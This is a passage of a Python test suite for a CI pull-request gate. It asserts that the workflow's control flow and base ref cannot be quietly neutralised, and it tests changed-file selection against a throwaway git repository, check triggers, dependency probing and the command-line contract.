        # This also normalises the `-ne 2` that names the tool-error code, which is safe because that
        # branch exits with `$code` whatever it compares against: a digit cannot turn a verdict into a
        # pass, while the operator and the variable stay pinned.
        return [re.sub(r"\b\d+\b", "N", canonical_shell(ln)) for ln in shell_of(step)
                if (ln.split() or [""])[0] in openers or re.search(r";\s*(then|do)\s*$", ln)]

    # Driven from `JOB_CONTROL`'s keys rather than from the steps, so a name that matches nothing
    # fails here instead of dropping its check. Filtering the steps by name meant a renamed step took
    # its pin with it and the count invariant absorbed the loss, because the reachability loop gained
    # the check this one lost.
    by_name = {s.get("name"): s for s in job_steps if "run" in s}
    for name, pinned in JOB_CONTROL.items():
        step = by_name.get(name)
        check(f"the control flow of {name!r} is the sequence it was reviewed with, so no condition "
              "can be falsified and no branch inserted — rename the step and this fails rather "
              f"than stops applying (JOB_CONTROL, JOB_STEPS, STEP_KEYS all key on {name!r})",
              step is not None and control_flow(step) == pinned,
              control_flow(step) if step else f"no step named {name!r}")
    # Through the real predicate on a mutated step. The controls here compared one list literal
    # against another built partly *from* it, so they could not fail: replacing `control_flow`'s body
    # with `return []` left all three passing — and left the gate step's pin passing too, since its
    # reviewed sequence is empty. The rule worked; nothing demonstrated that it did.
    for label, lines, pinned in (
            ("a retry loop that never iterates", ("while [ 1 = 2 ]; do", "done"), "Branch scope"),
            ("a gate wrapped in a false condition",
             ("if [ 1 = 2 ]; then", "python scripts/ai/pr_gate.py ${SEL}", "fi"), "Run the gate"),
            ("a branch inserted around the invocation",
             tuple(JOB_CONTROL["Branch scope"]) + ("if [ 1 = 2 ]; then", "fi"), "Branch scope")):
        found = control_flow(as_step(*lines))
        check(f"that rule rejects {label}", found != JOB_CONTROL[pinned], found)
    # An argv pin that rejects a correct respelling is how a rule gets deleted rather than fixed, so
    # the four spellings of the same permitted redirection are asserted to pass.
    for spelling in ('git rev-parse --verify --quiet "origin/${BASE_REF}" >/dev/null',
                     'git rev-parse --verify --quiet "origin/${BASE_REF}" > /dev/null',
                     'git rev-parse --verify --quiet "origin/${BASE_REF}" 2>/dev/null',
                     'git rev-parse --verify --quiet "origin/${BASE_REF}" >/dev/null 2>&1'):
        step = as_step("set -euo pipefail", spelling)
        check("and accept the same verify however its redirection is spelled",
              all(permitted_job(seg) for ln in shell_of(step) for seg, _ in parts(ln))
              and not redirections(step), spelling)

    # The selection's *input*, not just its spelling. SEL is pinned to `--base ${BASE}` below, and
    # BASE is whatever this step wrote: `echo "ref=HEAD"` left both permitted SEL lines untouched
    # and made the diff `HEAD...HEAD`, so the gate selected nothing and passed.
    # Same subject set as the cross-step rule above — every write to a GitHub file, selected by
    # destination — rather than the lines whose text contains `ref=`, which a second write could avoid
    # while still being the value the gate diffs against.
    ALLOWED_REF = ('echo "ref=" >> "$GITHUB_OUTPUT"',
                   'echo "ref=origin/${BASE_REF}" >> "$GITHUB_OUTPUT"')
    ref_lines = [ln.strip() for ln in run_contents(wf)
                 if re.search(r'>>?\s*"?\$GITHUB_OUTPUT', ln)]
    check("the base the selection diffs against is the real base ref, or empty for a dispatch",
          ref_lines and all(ln in ALLOWED_REF for ln in ref_lines), ref_lines)
    for mutant in ('echo "ref=HEAD" >> "$GITHUB_OUTPUT"',
                   'echo "ref=origin/main" >> "$GITHUB_OUTPUT"'):
        check(f"that rule rejects a neutralised base: {mutant.split('=')[1].split(chr(34))[0]}",
              mutant not in ALLOWED_REF)

    # Derived from the matrix, not asserted as a constant: a check whose min_python exceeds the
    # runner reports MISSING-DEP, and a missing dependency *fails* the gate. The first version
    # asserted 3.10 (what sys.stdlib_module_names needs) while harness_suites declares 3.11, so
    # a runner satisfying the test would have failed the job it was meant to protect.
    floor = max(c.get("min_python") or (3, 0) for c in pr_gate.CHECKS)
    # Read from the parsed document rather than off the raw text, which made an unquoted
    # `python-version: 3.13` — what a YAML formatter produces — parse as version 0.0 and blame the
    # matrix. Defaulted at every level: `gate_job` is `{}` when no single job runs the gate, and the
    # first spelling of this subscripted it, so a mutation that hid the gate job crashed the suite
    # here and skipped every check below instead of reporting the one that mattered.
    setup_with = next(((st.get("with") or {}) for st in (gate_job.get("steps") or [])
                       if st.get("name") == "Set up Python"), {})
    pinned = _dequote(str(setup_with.get("python-version", "")).strip())
    minor = re.match(r"^(\d+)\.(\d+)(?:\.\d+)?$", pinned)
    check("the runner's Python version is a literal this suite can compare against the floors — an "
          "expression (a matrix, a variable) is not one, and would be read as version 0.0",
          bool(minor), pinned)
    runner = (int(minor.group(1)), int(minor.group(2))) if minor else (0, 0)
    check(f"the runner meets the matrix's highest floor, {floor[0]}.{floor[1]}",
          runner >= floor, f"runner={runner}, floor={floor}")

    # Whole-file, not just the run lines: a `${{ }}` belongs on a `key: value` mapping line
    # (env:, group:, if:), never anywhere the shell sees it. Scanning parsed run bodies was the
    # weaker form — it could only reject what run_contents recognised, so a style it missed was
    # unexamined rather than rejected.
    injected = [ln for ln in strip_comments(wf).splitlines()
                if "${{" in ln and re.match(r"^\s*run:", ln)]
    injected += [ln for ln in run_contents(wf) if "${{" in ln]
    check("no shell line interpolates ${{ }}, so untrusted input arrives only via env",
          not injected, injected)
    for style, sample in (("single-line", '        run: echo "${{ github.event.number }}"\n'),
                          ("literal block", "        run: |\n          echo ${{ github.sha }}\n"),
                          ("folded block", "        run: >-\n          echo ${{ github.ref }}\n")):
        check(f"that rule sees a {style} run step, so it is not vacuous for one",
              [ln for ln in run_contents(sample) if "${{" in ln], sample)
    check("a token on an env: line is still allowed, or the rule would forbid the fix it wants",
          not [ln for ln in run_contents("          PR: ${{ github.event.number }}\n")
               if "${{" in ln])
else:
    check("pr-checks.yml exists to assert the gate is actually wired", False, "file missing")

print("\nSelection reads the merge base, so commits landed on the base after divergence "
      "do not enlarge it")
# Hermetic: a throwaway repo, so this asserts git behaviour rather than whatever the real
# repo happens to look like. A two-dot diff here would pick up base_only.txt and select
# checks for a file the pull request never touched.
def git(repo, *args):
    """Every call here mutates the fixture, so a failure must stop the run.

    The comment above promised hermeticity and nothing enforced it: each call site discarded the exit
    code, so a failed `init` — or a `TMPDIR` that itself sits inside a git repository — left `cwd`
    inside no repo of its own, and every following `add -A`, `commit` and `checkout -b` walked *up*
    into the enclosing one and rewrote the developer's history. Two reviewers ran into exactly that
    within one session, on this repository, and one of them also had a `git checkout` swap the
    workflow file underneath a running suite, which produced a measurement that had to be retracted.
    A promise of hermeticity has to be an assertion, so failures raise and the ceiling refuses any
    walk above the throwaway directory.
    """
    env = {**os.environ, "GIT_CEILING_DIRECTORIES": os.path.dirname(os.path.realpath(repo))}
    done = subprocess.run(["git", *args], cwd=repo, capture_output=True, text=True, env=env)
    if done.returncode:
        print("TOOL ERROR: fixture git %s failed in %s: %s"
              % (" ".join(args), repo, (done.stderr or done.stdout).strip()))
        raise SystemExit(2)
    return done


with tempfile.TemporaryDirectory() as repo:
    git(repo, "init", "-q", "-b", "base")
    top = git(repo, "rev-parse", "--show-toplevel").stdout.strip()
    check("the fixture repo is its own repository, not an enclosing one",
          os.path.realpath(top) == os.path.realpath(repo), (top, repo))
    git(repo, "config", "user.email", "t@example.com")
    git(repo, "config", "user.name", "t")
    open(os.path.join(repo, "seed.txt"), "w").write("seed\n")
    # Present on the base, so a later move reads as a deletion from it. Given a body, so
    # git's similarity detection actually fires — with a one-line file it falls back to
    # delete+add and the rename case is never exercised.
    os.makedirs(os.path.join(repo, "datasets", "sfdmu"), exist_ok=True)
    open(os.path.join(repo, "datasets", "sfdmu", "export.json"), "w").write(
        "\n".join(f'{{"object": "Obj{i}", "operation": "Upsert"}}' for i in range(40)))
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "seed")
    git(repo, "checkout", "-q", "-b", "feature")
    open(os.path.join(repo, "feature-change.md"), "w").write("feature work\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "feature work")
    git(repo, "checkout", "-q", "base")
    open(os.path.join(repo, "base_only.txt"), "w").write("landed after divergence\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base moves on")
    git(repo, "checkout", "-q", "feature")

    saved_root = pr_gate.REPO_ROOT
    try:
        pr_gate.REPO_ROOT = repo
        files = pr_gate.changed_files("base")
        check("the feature's own change is selected", "feature-change.md" in files, files)
        check("a commit landed on the base after divergence is excluded",
              "base_only.txt" not in files, files)

        # A rename must report the source too. Git's default rename detection names only
        # the destination, so moving a plan README out of datasets/sfdmu/ would not select
        # the check that notices the plan lost its README.
        git(repo, "mv", "datasets/sfdmu/export.json", "moved-away.json")
        git(repo, "commit", "-qm", "move it out")
        files = pr_gate.changed_files("base")
        check("a rename reports the source path, not only the destination",
              "datasets/sfdmu/export.json" in files, files)
        check("...and the destination", "moved-away.json" in files, files)
        check("moving a file out of a directory still selects that directory's check",
              "plan_readme_consistency" in selected_names(files), selected_names(files))

        # Non-ASCII paths: git quotes and escapes them unless -z is used, and a leading
        # quote matches no prefix.
        odd = os.path.join(repo, "docs")
        os.makedirs(odd, exist_ok=True)
        open(os.path.join(odd, "café.md"), "w").write("x\n")
        git(repo, "add", "-A")
        git(repo, "commit", "-qm", "non-ascii")
        files = pr_gate.changed_files("base")
        check("a non-ASCII path arrives unquoted and selects normally",
              any(f.endswith("café.md") for f in files), files)
        check("...and is not wrapped in quotes",
              not any(f.startswith('"') for f in files), files)

        # A wholly new, still-untracked directory. Plain `git status --porcelain` collapses
        # it to the topmost new directory ("brand-new/"), so the leaf file never reaches
        # selection: no .md suffix, no deeper prefix. The gate claims uncommitted work is
        # covered, so the collapse has to be defeated rather than documented.
        os.makedirs(os.path.join(repo, "brand-new", "guide"), exist_ok=True)
        open(os.path.join(repo, "brand-new", "guide", "page.md"), "w").write("# new\n")
        files = pr_gate.changed_files("base")
        check("a file inside a brand-new untracked directory reaches selection by full path",
              "brand-new/guide/page.md" in files, files)
        check("...and the collapsed directory entry is not what selection sees",
              "brand-new/" not in files, files)
        # The same collapse, now proved to change a verdict: this citation is wrong, and
        # doc_build_steps only sees it if the leaf path survives.
        open(os.path.join(repo, "brand-new", "guide", "page.md"), "w").write(
            "See step 99.99 of a flow that does not exist.\n")
        check("the new directory's markdown selects the build-step check",
              "doc_build_steps" in selected_names(pr_gate.changed_files("base")),
              selected_names(pr_gate.changed_files("base")))

        # A staged rename whose *source* path contains a space. With -z the source is its own
        # entry, carrying no `XY ` prefix, and the parser used to sniff for a space in the third
        # column: `ab cd/page.md` lost three characters and selected `cd/page.md` — a path that
        # does not exist — while the real one went unselected. Both halves of a rename are wanted,
        # because a check keyed on the old path (a doc citing it, a README listing it) has to run.
        os.makedirs(os.path.join(repo, "ab cd"), exist_ok=True)
        open(os.path.join(repo, "ab cd", "page.md"), "w").write("# spaced\n")
        git(repo, "add", "-A")
        git(repo, "commit", "-qm", "spaced path")
        git(repo, "mv", "ab cd/page.md", "renamed.md")
        files = pr_gate.changed_files("base")
        check("a renamed file's new path reaches selection", "renamed.md" in files, files)
        check("...and its old path arrives whole, not truncated at a space",
              "ab cd/page.md" in files and "cd/page.md" not in files, files)
    finally:
        pr_gate.REPO_ROOT = saved_root

print("\nEvery file a check reads can select that check")
# The absence hole one level up from a missing check: a check that runs, but not when the
# input it asserts against changes. Five of these shipped at once — a suite asserting that
# scripts/ai/README.md cites its current size while a README edit selected nothing; the
# CumulusCI pin compared against prepare-rlm-org.yml with that workflow untriggered; the
# "do not edit" generated references editable without the drift check; the manifest audit
# resolving paths repo-wide from a three-prefix trigger list; two suites reading skill and
# docs/references inputs outside their triggers. Each was invisible in the same way: the
# check passes, so nothing looks wrong. Enumerating the reads is what makes the sixth one
# fail loudly instead of joining quietly.
#
# Paths a suite names but does not depend on, so an unavoidable static-analysis false
# positive is a written decision rather than a loosened rule.
NOT_INPUTS = {
    "tests/test_pr_gate.py": {
        "datasets/sfdmu": "a path built inside a throwaway repo, not read from this one",
    },
    "tests/test_skill_manifest_audit.py": {
        # .agents/artifacts is gitignored, so it can never appear in a PR diff — nothing
        # there is selectable, which is the very asymmetry this suite exists to pin.
        ".agents/artifacts": "gitignored: cannot appear in a diff, so cannot select anything",
        ".agents/artifacts/integration-staging/pmos-integration.md": "gitignored",
    },
    "tests/test_fix_scratch_identity.py": {
        ".sf/orgs": "runtime org state, gitignored — not a repo input",
    },
    "tests/build_harness/test_tui_runner.py": {
        "orgs/ent.json": "a value in a stubbed load_cci dict, with runner.ROOT pointed at "
                         "tmp_path — never read from this repo",
    },
}


#: Names the suites use for the repository root. A single path segment counts as a read only
#: when it hangs off one of these: os.path.join(REPO, "tui-cci") is the root launcher, while
#: os.path.join(ERD_DIR, "README.md") is not the root README, and treating the two alike
#: reported both erd-count suites as reading a file they never touch.
#: Deliberately excludes a bare `root`, which the harness suites use for a tmp_path fixture
#: they write into — `root / "cumulusci.yml"` there is not this repo's cumulusci.yml.
ROOT_NAMES = {"REPO", "REPO_ROOT", "ROOT", "repo_root"}


def root_anchored(node):
    """Segments of a `REPO / "a" / "b"` chain, or () if it is not rooted at the repo."""
    segs = []
    while isinstance(node, ast.BinOp) and isinstance(node.op, ast.Div):
        if not (isinstance(node.right, ast.Constant) and isinstance(node.right.value, str)):
            return ()
        segs.insert(0, node.right.value)
        node = node.left
    return tuple(segs) if isinstance(node, ast.Name) and node.id in ROOT_NAMES else ()


def named_paths(py_file, joins_only=False):
    """Repo-relative paths a source file names, from string constants and os.path.join()."""
    try:
        tree = ast.parse(pathlib.Path(py_file).read_text(encoding="utf-8"))
    except (OSError, SyntaxError):
        return set()
    found = set()
    # ast.walk visits the inner nodes of a `REPO / "scripts" / "ai" / "x.py"` chain too, and
    # each one is a valid rooted path — reporting the prefixes as separate reads.
    partial = {id(n.left) for n in ast.walk(tree)
               if isinstance(n, ast.BinOp) and isinstance(n.op, ast.Div)}
    for node in ast.walk(tree):
        if isinstance(node, ast.Constant) and isinstance(node.value, str) and not joins_only:
            if "/" in node.value and not node.value.startswith(("/", "http")):
                found.add(node.value.strip("/"))
        elif isinstance(node, ast.BinOp):
            # repo_root / "tui-cci" — a single root-level segment carries no slash to
            # recognise it by, so this read stayed invisible: the launcher had no trigger at
            # all and the mutation proving that survived.
            segs = root_anchored(node) if id(node) not in partial else ()
            if segs:
                found.add("/".join(segs))
        elif isinstance(node, ast.Call):
            # os.path.join(REPO, "a", "b") — the segments carry no slash of their own, so
            # the constant branch above cannot see this shape.
            fn = node.func
            if isinstance(fn, ast.Attribute) and fn.attr == "join" and node.args:
                segs = [a.value for a in node.args[1:]
                        if isinstance(a, ast.Constant) and isinstance(a.value, str)]
                rooted = (isinstance(node.args[0], ast.Name)
                          and node.args[0].id in ROOT_NAMES)
                if len(segs) == len(node.args) - 1 and segs and (len(segs) > 1 or rooted):
                    found.add("/".join(segs))
    # A lone root-level segment counts only when it names a file. `ROOT / "scripts"` is a
    # directory on its way to a longer path, not something a suite reads.
    return {p for p in found
            if "/" in p or os.path.isfile(os.path.join(REPO, p))}


def check_sources(spec):
    """The test suites a check's command executes.

    Suites only, deliberately: running a suite runs everything in it, so every path it names
    is a path it reads. A script invoked with a subcommand (`skill_manifest.py --check`)
    exercises one branch, so its other paths — a report's output file, a table another
    subcommand renders — would be false positives. Those checks get the exact, data-driven
    gates below instead of a static read of the whole file.
    """
    if spec["name"] == "stdlib_offline_suites":
        return list(pr_gate.STDLIB_SUITES)
    if spec["name"] == "requests_offline_suites":
        return list(pr_gate.REQUESTS_SUITES)
    if spec["cmd"] is None:
        return []
    sources = []
    for arg in spec["cmd"][1:]:
        if arg.endswith(".py") and arg.startswith("tests/"):
            sources.append(arg)
        elif os.path.isdir(os.path.join(REPO, arg)):
            # A directory argument is ~30 suites plus their conftest.py. Skipping it — the
            # first version of this function did, having only matched names ending in .py —
            # left every nested harness suite outside the guarantee, which is how the root
            # `tui-cci` launcher came to be read by a test that no check selected.
            for root, _dirs, files in os.walk(os.path.join(REPO, arg)):
                sources += [os.path.relpath(os.path.join(root, f), REPO)
                            for f in files if f.endswith(".py")]
    return sources


def as_change(rel):
    """A directory named as an input stands for a change underneath it."""
    return rel + "/probe" if os.path.isdir(os.path.join(REPO, rel)) else rel


SELF = "tests/test_pr_gate.py"
unselected_reads, inspected = [], 0
for spec in pr_gate.CHECKS:
    for src in check_sources(spec):
        declared = NOT_INPUTS.get(src, {})
        # This suite is *about* selection, so nearly every path it names is a fixture — an
        # expected trigger, a probe, content written into a throwaway repo. Enumerating those
        # produced a declaration list that grew with every assertion added, which is the drift
        # this gate is supposed to prevent, not cause. Every real read here goes through
        # os.path.join(REPO, …), so that shape is the enumeration, and the check below refuses
        # a read written any other way.
        for rel in sorted(named_paths(os.path.join(REPO, src), joins_only=(src == SELF))):
            inspected += 1
            if rel in declared or not os.path.exists(os.path.join(REPO, rel)):
                continue
            if not pr_gate.selects(spec, [as_change(rel)]):
                unselected_reads.append(f"{spec['name']} reads {rel} ({src}) but is not "
                                        f"selected by it")
check("no suite reads a file that cannot select it", not unselected_reads,
      "; ".join(unselected_reads[:8]))
check("the enumeration actually inspected something", inspected > 20, inspected)

# The other direction of the same rule: a check must also be selected by the script it *runs*.
# The enumeration above walks each check's test-suite sources, so for the two checks whose
# command is a validator rather than a suite it saw nothing — and both were editable without
# the check that executes them running, leaving only a syntax scan between a semantic
# regression in a validator and a merge.
def unrun_commands(specs):
    out = []
    for spec in specs:
        for arg in (spec["cmd"] or [])[1:]:
            if (arg.endswith((".py", ".sh")) and os.path.isfile(os.path.join(REPO, arg))
                    and not pr_gate.selects(spec, [arg])):
                out.append(f"{spec['name']} runs {arg} but is not selected by it")
    return out


check("no check runs a script that cannot select it", not unrun_commands(pr_gate.CHECKS),
      "; ".join(unrun_commands(pr_gate.CHECKS)))
# Positive control: with the matrix correct, blinding the rule above yields the same empty
# result, so the assertion alone cannot tell a held property from an unexercised one.
check("that rule can actually detect a violation",
      unrun_commands([dict(name="probe", cmd=["python", "scripts/ai/pr_gate.py"],
                           triggers=["datasets/"])]) != [])
# Coverage of the enumeration itself, which the failure above cannot assert: a shape it stops
# recognising silently narrows the guarantee instead of failing. Both shapes below were blind
# spots that let a real missing trigger through — the nested suites reached only via a
# directory argument, and the root launcher named as a single rooted segment.
enumerated = {s for spec in pr_gate.CHECKS for s in check_sources(spec)}
check("the enumeration reaches suites named only by a directory argument",
      "tests/build_harness/test_tui_launcher.py" in enumerated)
check("a single root-level segment is recognised as a read",
      "tui-cci" in named_paths(os.path.join(REPO, "tests/build_harness/test_tui_launcher.py")))
# The two rooted single-segment shapes, told apart: a root *file* is a read, a root directory
# is the start of a longer path. Asserted on a synthetic source because no suite currently
# writes the directory form, so the distinction is otherwise unobservable.
shapes = tempfile.NamedTemporaryFile("w", suffix=".py", delete=False)
shapes.write('a = os.path.join(REPO, "tui-cci")\nb = os.path.join(REPO, "scripts")\n')
shapes.close()
try:
    shape_reads = named_paths(shapes.name)
    check("a rooted root-file segment counts as a read", "tui-cci" in shape_reads)
    check("a rooted root-directory segment does not", "scripts" not in shape_reads, shape_reads)
finally:
    os.unlink(shapes.name)

# The convention the joins_only narrowing above depends on: a read written as
# open("docs/x.md") in this file would be invisible to the enumeration, so it is refused
# outright rather than left as a quiet exemption.
self_src = "\n".join(
    ln for ln in pathlib.Path(os.path.join(REPO, SELF)).read_text(
        encoding="utf-8").splitlines()
    if not ln.lstrip().startswith("#"))  # the comment above names the shape it forbids
bare_reads = re.findall(r'(?:open|read_text|Path)\(\s*"[^"]*/[^"]*"', self_src)
check("this suite reads repo files only through os.path.join(REPO, …)",
      not bare_reads, bare_reads)

# agent_tooling asserts these files exist, so deleting one must select it. Read back out of
# the script for the same reason as the manifest roots below: a hand-kept copy drifts.
tooling_src = pathlib.Path(
    os.path.join(REPO, "scripts", "ai", "analyze_agent_tooling.py")).read_text()
required = []
for const in ("REQUIRED_FILES", "GENERATED_CCI_REFERENCE_FILES", "BASELINE_EXTRA_FILES"):
    block = re.search(rf"^{const} = \[(.*?)\]", tooling_src, re.S | re.M)
    check(f"analyze_agent_tooling.py still declares {const}", block is not None)
    required += re.findall(r'"([^"]+)"', block.group(1) if block else "")
tooling_check = check_named("agent_tooling")
check("the agent_tooling check still exists under that name", tooling_check is not None)
check("the required-file list is non-trivial", len(required) > 8, len(required))
missed_required = [r for r in required if not pr_gate.selects(tooling_check, [r])]
check("every file agent_tooling asserts the presence of can select it",
      not missed_required, missed_required)

# The manifest audit resolves paths anywhere under its own declared roots, so the trigger
# list is read back out of the script rather than kept in step by hand.
manifest_src = pathlib.Path(os.path.join(REPO, "scripts", "ai", "skill_manifest.py")).read_text()
roots = re.search(r"_PATH_ROOTS = \((.*?)\)", manifest_src, re.S)
root_files = re.search(r"_ROOT_FILES = \((.*?)\)", manifest_src, re.S)
check("skill_manifest.py still declares the roots it audits",
      roots is not None and root_files is not None)
audited = [v for v in re.findall(r'"([^"]+)"', (roots.group(1) if roots else "")
                                 + (root_files.group(1) if root_files else ""))]
check("the audited root list is non-trivial", len(audited) > 15, len(audited))
manifest_check = check_named("skill_manifest")
check("the skill_manifest check still exists under that name", manifest_check is not None)
missed_roots = [r for r in audited
                if not pr_gate.selects(manifest_check, [r.rstrip("/") + "/probe.md"
                                                        if r.endswith("/") else r])]
check("every root the manifest audit resolves can select the manifest check",
      not missed_roots, missed_roots)

print("\nThe CCI reference drift check watches only what the generator writes")
src = open(os.path.join(REPO, "scripts", "ai", "pr_gate.py")).read()
check("the drift scope names the three generated files",
      all(n in src for n in ("tasks-reference.md", "flows-reference.md",
                             "feature-flags.md")))
# Scoped to the function, not the file: docs/references/ is a legitimate trigger elsewhere
# (a suite validates a shipped example under it), so a whole-file search would conflate the
# two and pass or fail for the wrong reason.
drift_body = src.split("def run_cci_reference_drift")[1].split("\ndef ")[0]
drift_code = "\n".join(ln for ln in drift_body.splitlines()
                       if not ln.lstrip().startswith("#"))
check("the drift scope no longer includes hand-authored docs/references/",
      "docs/references/" not in drift_code,
      "generate_cci_reference.py writes only to .cursor/skills/cci-orchestration/")
# This check adjudicates hand edits to files that carry a "do not edit" banner, so each of
# them has to be able to select it. Not reachable by the read-enumeration above: the scope
# lives inside a cmd=None runtime branch, which is exactly where an ungated input hides.
drift_check = check_named("cci_reference_drift")
check("the cci_reference_drift check still exists under that name", drift_check is not None)
drift_scope = [f".cursor/skills/cci-orchestration/{n}"
               for n in re.findall(r'"([^"]+\.md)"', drift_code)]
check("the drift scope was parsed out of the function", len(drift_scope) == 3, drift_scope)
unselecting = [g for g in drift_scope if not pr_gate.selects(drift_check, [g])]
check("every generated file the drift check judges can select it", not unselecting,
      unselecting)

print("\nA dependency-blocked advisory check does not fail the gate")
listing = changed_list("zz_probe_path/thing.txt")
pr_gate.CHECKS.append(dict(name="zz_probe_advisory", cmd=["python", "-c", "pass"],
                           triggers=["zz_probe_path/"], deps=["pytest"], gating=False,
                           note="probe"))
saved = dict(pr_gate.DEPS)
try:
    pr_gate.DEPS["pytest"] = "a_module_that_does_not_exist_anywhere"
    code, out = main_with(["--changed-files-from", listing])
    check("an advisory check blocked on a dependency does not fail the gate", code == 0, code)
    check("it is labelled ADVISORY-DEP rather than passed over", "ADVISORY-DEP" in out)
finally:
    pr_gate.DEPS.clear()
    pr_gate.DEPS.update(saved)
    pr_gate.CHECKS.pop()
    os.unlink(listing)

print("\nA check with no command and no resolve() branch is a tool error, not a verdict")
exit_code = None
try:
    pr_gate.resolve(dict(name="zz_probe_nocmd", cmd=None, triggers=[], deps=[],
                         gating=True))
except SystemExit as exc:
    exit_code = exc.code
check("an unresolvable check exits 2, not a traceback or a gating failure",
      exit_code == 2, exit_code)
for name in ("cci_reference_drift", "stdlib_offline_suites", "yaml_offline_suites"):
    spec = check_named(name)
    check(f"{name} resolves to a runnable callable",
          spec is not None and callable(pr_gate.resolve(spec)))

print("\nCommand-line contract")
code, out = run_gate("--list")
check("--list exits 0", code == 0, code)
check("--list names every check", all(n in out for n in names))
code, out = run_gate("--base", "HEAD", "--all")
check("two selectors at once is a usage error (exit 2, never 1)", code == 2, code)
code, out = run_gate()
check("no selector is a usage error", code == 2, code)
code, out = run_gate("--requirements", "--all")
check("--requirements emits the pinned CumulusCI spec",
      "cumulusci==" in out, out.strip())
check("--requirements emits nothing unpinned for cumulusci",
      not re.search(r"^cumulusci$", out, re.M), out.strip())
# Installing exactly what --requirements prints has to leave the dependency importable.
# CumulusCI needs pkg_resources at import time, which a 3.12+ venv lacks until setuptools is
# installed — so omitting it here hands the caller a MISSING-DEP for a package it just
# installed, and pip's install order means the pin must come first.
req_lines = [ln for ln in out.splitlines() if ln.strip()]
check("--requirements pairs the CumulusCI pin with setuptools",
      any(ln.startswith("setuptools") for ln in req_lines), req_lines)
def first_line(prefix):
    """Index of the first requirement with this prefix, or None.

    Spelled as a bare `next()`, this raised StopIteration on exactly the input the check above had
    just reported as missing — the suite aborted instead of reporting the finding it had made.
    """
    return next((i for i, ln in enumerate(req_lines) if ln.startswith(prefix)), None)


setuptools_at, cumulusci_at = first_line("setuptools"), first_line("cumulusci")
check("...and emits setuptools before CumulusCI, the order pip installs in",
      setuptools_at is not None and cumulusci_at is not None and setuptools_at < cumulusci_at,
      req_lines)
code, out_nocci = run_gate("--requirements", "--changed-files-from", os.devnull)
check("a selection without CumulusCI does not drag setuptools in",
      "setuptools" not in out_nocci, out_nocci.strip())

# pyproject.toml carries [tool.pytest.ini_options], so it decides what the two pytest-invoking
# checks collect. If it selected nothing, a change that broke collection would merge without
# either suite running once.
pytest_driven = {c["name"] for c in pr_gate.CHECKS
                 if c["cmd"] and "pytest" in " ".join(c["cmd"])}
selected_by_pyproject = set(selected_names(["pyproject.toml"]))
check("pyproject.toml selects every pytest-driven check",
      pytest_driven and pytest_driven <= selected_by_pyproject,
      sorted(pytest_driven - selected_by_pyproject))
# This suite runs the gate, so its probe path must not select a check that runs this suite
# (infinite nesting) or one whose dependency CI would not have installed for the outer
# selection (a MISSING-DEP failure that says nothing about the gate).
# erd-data.json selects exactly one check, which needs no package and does not run this
# suite. It replaced .claude/skill-manifest.yml, which stopped qualifying once a manifest
# edit started (correctly) selecting the PyYAML-dependent suite that audits the manifest.
PROBE_PATH = "docs/erds/erd-data.json"
probe_selection = [c for c in pr_gate.CHECKS if pr_gate.selects(c, [PROBE_PATH])]
nesting_fixture = changed_list("tests/test_branch_scope.py")
try:
    main_with(["--changed-files-from", nesting_fixture])
    refused = False
except AssertionError:
    refused = True
finally:
    os.unlink(nesting_fixture)
check("a fixture that would nest the gate inside itself is refused, not run", refused,
      "pr_gate_suite triggers on tests/, so running it on a tests/ fixture recurses")
check("the probe path selects at least one check", probe_selection != [])
check("the probe path selects no check that re-runs this suite",
      all("tests/test_pr_gate.py" not in (c["cmd"] or []) for c in probe_selection)
      # cmd=None checks expand at runtime, so the command list alone is not enough: a
      # bulk-suite check would satisfy the test above while still re-running this file.
      and "tests/test_pr_gate.py" not in pr_gate.STDLIB_SUITES
      and not any(c["name"] == "stdlib_offline_suites" for c in probe_selection),
      [c["name"] for c in probe_selection])
check("the probe path needs no installed dependency",
      all(not c["deps"] for c in probe_selection),
      {c["name"]: c["deps"] for c in probe_selection})

with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
    fh.write(PROBE_PATH + "\n")
    changed = fh.name
try:
    code, out = run_gate("--changed-files-from", changed)
    check("a changed-file list runs the checks it selects and exits 0", code == 0, out[-400:])
    check("the report prints a line for every check",
          all(re.search(rf"\] {re.escape(n)}\b", out) for n in names),
          [n for n in names if not re.search(rf"\] {re.escape(n)}\b", out)])
    check("skipped checks say why they were skipped", "nothing it covers changed" in out)
    # Every check lands in exactly one bucket and the buckets sum to the total, so a reader
    # reconciling them never finds one unaccounted for.
    buckets = re.search(r"(\d+) checks: (\d+) executed, (\d+) skipped, "
                        r"(\d+) blocked on a missing dependency, (\d+) failed", out)
    check("the summary reports every bucket separately", buckets is not None, out[-300:])
    check("the buckets account for every check",
          buckets and int(buckets.group(1)) == sum(int(buckets.group(i))
                                                  for i in (2, 3, 4)),
          buckets.groups() if buckets else None)
finally:
    os.unlink(changed)

# A dependency that is present on disk but cannot be imported must read as absent. This is
# not hypothetical: cumulusci 4.8.1 imports `fs`, which imports `pkg_resources`, which a
# Python 3.12+ venv lacks until setuptools is installed. find_spec called that install fine
# and the breakage surfaced as two unrelated-looking suite failures instead of one blocked
# dependency, so the probe has to be a real import.
with tempfile.TemporaryDirectory() as probe_dir:
    name = "zz_present_but_unimportable"
    pathlib.Path(probe_dir, name + ".py").write_text(
        "raise ModuleNotFoundError(\"No module named 'pretend_transitive_dep'\")\n")
    prior_path, prior_cache = sys.path[:], dict(pr_gate._IMPORTABLE)
    prior_env = os.environ.get("PYTHONPATH")
    sys.path.insert(0, probe_dir)
    os.environ["PYTHONPATH"] = probe_dir + os.pathsep + (prior_env or "")
    try:
        pr_gate._IMPORTABLE.clear()
        check("find_spec alone would call the broken dependency present",
              importlib.util.find_spec(name) is not None)
        check("a present-but-unimportable dependency reads as absent",
              pr_gate.have_module(name) is False)
        pr_gate._IMPORTABLE.clear()
        check("a genuinely importable dependency still reads as present",
              pr_gate.have_module("json") is True)
    finally:
        sys.path[:] = prior_path
        if prior_env is None:
            os.environ.pop("PYTHONPATH", None)
        else:
            os.environ["PYTHONPATH"] = prior_env
        pr_gate._IMPORTABLE.clear()
        pr_gate._IMPORTABLE.update(prior_cache)

check("cumulusci is probed at the depth a task actually needs",
      pr_gate.DEPS["cumulusci"] == "cumulusci.core.tasks", pr_gate.DEPS["cumulusci"])

# A failed `git status` returns empty stdout, which reads exactly like a clean tree. In
# changed_files that would silently drop every uncommitted path from the selection; in the
# CCI-reference check, where the status IS the verdict, it would report "no drift" and pass.
# Both must fail loudly instead, so both return codes are asserted here.
